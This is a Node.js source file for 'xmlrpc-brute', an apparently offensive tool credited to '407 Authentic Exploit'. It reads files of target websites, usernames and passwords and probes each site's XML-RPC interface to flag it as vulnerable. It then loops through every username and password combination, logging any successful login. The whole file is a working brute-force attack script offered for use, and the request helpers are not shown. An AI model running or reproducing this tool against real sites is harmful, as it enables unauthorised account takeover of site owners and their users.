const fs = require('fs');
const yargs = require('yargs/yargs');
const {
    hideBin
} = require('yargs/helpers');
const asciify = require('asciify');
const {
    red,
    green,
    blue,
    symbols: {
        info,
        check,
        cross,
        warning,
        radioOff
    }
} = require('ansi-colors');

const argv = yargs(hideBin(process.argv))
  .usage('Usage: node . [options...]')
  .options({
      siteList: {
          alias: 's',
          description: 'path to file containing websites',
          requiresArgv: true,
          required: true
      },
      userList: {
          alias: 'u',
          description: 'path to file containing username',
          requiresArgv: true,
          required: true
      },
      passList: {
          alias: 'p',
          description: 'path to file containing password',
          requiresArgv: true,
          required: true
      },
  })
  .argv;

const {
    cwd: pathTo
} = process;
const {
    siteList,
    userList,
    passList,
    help
} = argv;

const {
    delay,
    getListMethods,
    sayHello,
    testLogin
} = require(pathTo() + '/' + 'src/helpers');

var rsiteList, ruserList, rpassList;

/**
 * String prototype ansii
 */

String.prototype.ansii = function ({
    type,
    color
} = {}) {
    return `${'[' + color(type) + ']'} ${this}`;
}

let pathSiteList = fs.existsSync(pathTo() + '/' + siteList);
let pathUserList = fs.existsSync(pathTo() + '/' + userList);
let pathPassList = fs.existsSync(pathTo() + '/' + passList);

if (!!pathSiteList) {
    rsiteList = fs.readFileSync(pathTo() + '/' + siteList, 'utf-8');
}
if (!!pathUserList) {
    ruserList = fs.readFileSync(pathTo() + '/' + userList, 'utf-8');
}
if (!!pathPassList) {
    rpassList = fs.readFileSync(pathTo() + '/' + passList, 'utf-8');
}

if (!(pathSiteList && pathUserList && pathPassList)) {
    console.log(`file not found`.ansii({
        type: warning,
        color: red
    }));
} else {
    main();
}

async function main() {
    asciify('xmlrpc-brute', {
        font: 'puffy'
    }, function (err, log) {
        console.log(log);
        console.log('                   - ibnusyawall | 407 Authentic Exploit -\n');
    });

    var listSite = rsiteList.split`\n`.filter(site => site);
    var listUser = ruserList.split`\n`.filter(user => user);
    var listPass = rpassList.split`\n`.filter(pass => pass);

    const bulk = {
        site: []
    }

    for (var i = 0; i < listSite.length; i++) {
        await delay(2000);
        var url = listSite[i];
        try {
            var {
                status
            } = await getListMethods(url);
            console.log(`Site vuln: ${url}`.ansii({
                type: info,
                color: blue
            }));
            bulk.site[url] = {
                status: true,
                users: null
            }

            var {
                string
            } = await sayHello(url);
            console.log(`Site say: ${string}`.ansii({
                type: info,
                color: blue
            }));
            console.log('Trying to bruteforce attack...\n'.ansii({
                type: info,
                color: blue
            }));
            await delay(2000);
            for (var u = 0; u < listUser.length; u++) {
                for (var p = 0; p < listPass.length; p++) {
                    await delay(1000);
                    try {
                        var {
                            data
                        } = await testLogin(url, {
                            username: listUser[u],
                            password: listPass[p]
                        });
                        console.log(`URL: ${url}`.ansii({
                            type: radioOff,
                            color: green
                        }));
                        console.log(`Trying with: ${listUser[u]}|${listPass[p]}`.ansii({
                            type: info,
                            color: blue
                        }));
                        console.log('Success Loggedin\n'.ansii({
                            type: check,
                            color: green
                        }));
                    } catch ({
                        message
                    }) {
                        console.log(`URL: ${url}`.ansii({
                            type: radioOff,
                            color: green
                        }));
                        console.log(`Trying with: ${listUser[u]}|${listPass[p]}`.ansii({
                            type: info,
                            color: blue
                        }));
                        console.log(`${message ? message : 'maybe request was blocked.'}\n`.ansii({
                            type: warning,
                            color: red
                        }));
                    }
                }
            }
        } catch (e) {
            bulk.site[url] = {
                status: false
            }

            console.log(`Site not vuln: ${url}`.ansii({
                type: warning,
                color: red
            }));
        }
    }
}
